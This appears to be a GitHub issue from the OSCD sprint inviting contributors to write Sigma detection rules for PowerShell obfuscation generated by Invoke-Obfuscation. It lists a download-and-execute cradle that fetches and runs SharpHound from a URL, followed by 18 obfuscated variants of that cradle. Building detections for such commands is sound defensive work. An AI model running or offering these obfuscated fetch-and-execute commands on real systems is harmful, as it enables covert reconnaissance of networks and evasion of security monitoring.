## Hello, fellow OSCD participant!
This is your guide on how you can help us with soving this issue.

## Tasklist
You can pick up some of the methods of PowerShell command and script obfuscation, provided by the [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) framework from the table below and develop Sigma rules for them. You will need to use [regular expressions](https://github.com/Neo23x0/sigma/wiki/Specification#types) in Sigma rules.

## Original command
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
```

## Invoke-Obfuscation premise
```powershell
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
SET SCRIPTBLOCK Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
```
### Just pick up the Case # you prefer and write a Sigma rule for it. When you're done, create a Pull Request to OSCD Sigma branch and specify this issue's number and the number of the case you solved (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1"*)

### TOKEN OBFUSCATION
| Case # | Option #1 | Option #2 | Option #3 | Result |
| :---: | :---: | :---: | :---: | --- |
| 1 | TOKEN | TOKEN\STRING | TOKEN\STRING\1 | Invoke-Expression (New-Object Net.WebClient).DownloadString(('ht'+'tp'+'s://raw.gith'+'ubus'+'e'+'rcont'+'ent.com/BloodHo'+'und'+'A'+'D'+'/B'+'loo'+'dHo'+'un'+'d/a7'+'e'+'a5'+'36'+'387'+'0d92'+'5bc31'+'d'+'3'+'a441a361f38b0a'+'add0b'+'/Inge'+'s'+'tors/'+'Shar'+'pHou'+'n'+'d'+'.ps'+'1')); Invoke-BloodHound 
| 2 | TOKEN | TOKEN\STRING | TOKEN\STRING\1 | Invoke-Expression (New-Object Net.WebClient).DownloadString(("{16}{2}{17}{26}{10}{0}{3}{19}{7}{9}{6}{5}{8}{20}{23}{4}{18}{12}{24}{22}{11}{1}{25}{21}{13}{15}{14}"-f 'ntent.com/Blo','s/','/','o','441','ea5363870','nd/a7','ood','d92','Hou','.githubuserco','Ingestor','38b','und.p','1','s','https:','/r','a361f','dHoundAD/Bl','5bc3','o','aadd0b/','1d3a','0','SharpH','aw')); Invoke-BloodHound 
| 3 | TOKEN | TOKEN\COMMAND | TOKEN\COMMAND\1 | i`N`VOKe-E`xpRe`S`SIOn (new-`obJE`cT Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); InVoKe-b`l`OOdH`o`U`ND 
| 4 | TOKEN | TOKEN\COMMAND | TOKEN\COMMAND\2 | .('Invoke-E'+'xpr'+'es'+'s'+'i'+'on') (&('New-Obj'+'e'+'c'+'t') Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); .('Invo'+'ke-B'+'loodHoun'+'d') 
| 5 | TOKEN | TOKEN\COMMAND | TOKEN\COMMAND\3 | .("{1}{0}{2}{3}"-f 'oke','Inv','-','Expression') (&("{2}{3}{0}{1}" -f 'jec','t','N','ew-Ob') Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); &("{3}{1}{0}{2}"-f 'd','loo','Hound','Invoke-B') 
| 6 | TOKEN | TOKEN\ARGUMENT | TOKEN\ARGUMENT\1 | Invoke-Expression (New-Object net.weBclIEnt).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound 
| 7 | TOKEN | TOKEN\ARGUMENT | TOKEN\ARGUMENT\2 | Invoke-Expression (New-Object Net`.W`eBcL`ie`NT).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
| 8 | TOKEN | TOKEN\ARGUMENT | TOKEN\ARGUMENT\3 | Invoke-Expression (New-Object ('Net'+'.W'+'ebClie'+'nt')).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
| 9 | TOKEN | TOKEN\ARGUMENT | TOKEN\ARGUMENT\4 | Invoke-Expression (New-Object ("{2}{3}{1}{0}"-f'ent','ebCli','Net.','W')).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound 
| 10 | TOKEN | TOKEN\MEMBER | TOKEN\MEMBER\1 | Invoke-Expression (New-Object Net.WebClient).DOwNlOadsTriNg('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
| 11 | TOKEN | TOKEN\MEMBER | TOKEN\MEMBER\2 | Invoke-Expression (New-Object Net.WebClient)."Dow`NL`oaDST`R`ING"('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
| 12 | TOKEN | TOKEN\MEMBER | TOKEN\MEMBER\3 | Invoke-Expression (New-Object Net.WebClient).('Dow'+'nloadStrin'+'g').Invoke('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
| 13 | TOKEN | TOKEN\MEMBER | TOKEN\MEMBER\4 | Invoke-Expression (New-Object Net.WebClient).("{3}{2}{1}{0}" -f'g','nloadStrin','ow','D').Invoke('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
| 14 | TOKEN | TOKEN\WHITESPACE | TOKEN\WHITESPACE\1 | Invoke-Expression (  New-Object Net.WebClient ).DownloadString(  'https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1') ;   Invoke-BloodHound
| 15 | TOKEN | TOKEN\ALL | TOKEN\ALL\1 | &("{4}{2}{1}{0}{5}{3}"-f'-Expres','oke','v','on','In','si') (.("{0}{3}{1}{2}"-f'New-O','j','ect','b') ("{1}{0}{4}{2}{3}"-f 'e','N','Cli','ent','t.Web')).("{0}{2}{1}" -f'D','loadString','own').Invoke(("{12}{0}{7}{14}{17}{1}{16}{6}{5}{15}{8}{10}{3}{18}{11}{2}{4}{13}{19}{20}{9}" -f'aw.g','erconten','1d3a44','dHound/a7','1a36','Bloo','.com/','ith','Ho','estors/SharpHound.ps1','undAD/Bloo','25bc3','https://r','1f38b0','ubu','d','t','s','ea5363870d9','aadd0b','/Ing')); &("{1}{4}{2}{3}{5}{0}" -f 'Hound','Inv','lo','o','oke-B','d')

### STRING OBFUSCATION
| Case # | Option #1 | Option #2 | Option #3 | Result |
| :---: | :---: | :---: | :---: | --- |
| 16 | STRING | STRING\1 | - | &( ([stRING]$VeRBoSePrEfErencE)[1,3]+'x'-Join'')((('Invok'+'e-E'+'xpress'+'i'+'on'+' ('+'N'+'ew-Ob'+'jec'+'t Net.'+'WebClien'+'t).D'+'ownloa'+'dString'+'('+'{0}https://raw.githu'+'b'+'u'+'se'+'rcont'+'e'+'nt.co'+'m/BloodHoundA'+'D/BloodHound/a'+'7ea'+'53'+'6'+'3'+'870d925'+'bc31d3a441a'+'361f38b0'+'aadd0b/Ing'+'estor'+'s/SharpHound.ps1{0}); I'+'n'+'vo'+'ke'+'-'+'BloodHou'+'n'+'d')-F [ChaR]39) ) 
| 17 | STRING | STRING\2 | - |  (("{5}{38}{43}{10}{47}{49}{13}{36}{40}{6}{53}{19}{14}{33}{22}{23}{0}{39}{7}{25}{11}{35}{20}{8}{21}{34}{41}{44}{28}{26}{9}{27}{18}{55}{4}{3}{45}{1}{16}{37}{42}{50}{32}{30}{12}{31}{56}{46}{24}{17}{15}{52}{29}{51}{2}{48}{54}" -f 'w.git','c31','voke','d','0','Invo','Client).Downl','bu','o','d','ion (New-Objec','rc','Inges','et.','in','ps','d3a441a','und.','7ea5','tr','tent.c','m/','VFhttps:','//ra','Ho','se','un','/a','loodHo','F); ','b/','t','0aadd0','g(G','Blo','on','We','361','ke','hu','b','odHo','f3','-Express','undAD/B','925b','p','t ','-B','N','8b','In','1GV','oadS','loodHound','36387','ors/Shar')).RepLAcE(([CHar]71+[CHar]86+[CHar]70),[STRiNG][CHar]39)|IEx
| 18 | STRING | STRING\2 | - | SET  ("9"+"sca"+"Vi") (  [CHaR[ ] ]" ))93]RaHC[]GNirTs[,'ocD'(ecaLPEr.)'dnuo'+'HdoolB'+'-ekovn'+'I'+' '+';)ocD1sp.dnuoHpra'+'hS/srotsegnI/b0'+'d'+'daa0b83f163'+'a144a3d13cb529d0'+'783635ae7a/dnuoHdoolB/DAdnuoH'+'do'+'olB/mo'+'c.tnet'+'nocre'+'s'+'ub'+'u'+'hti'+'g.war//:sptt'+'hoc'+'D(gnirt'+'S'+'da'+'ol'+'nwoD.)t'+'neilC'+'be'+'W.te'+'N tcej'+'bO-weN'+'( noi'+'sserp'+'xE-ekovnI'(( xEI"  ); [ArraY]::REVErSe((GEt-VARIAble ("9"+"sCA"+"vI")  -va ));. ( ([strInG]$VerboSepreFERENcE)[1,3]+'x'-joIn'')([STrING]::jOIn( '', (GEt-VARIAble ("9"+"sCA"+"vI")  -va )) ) 
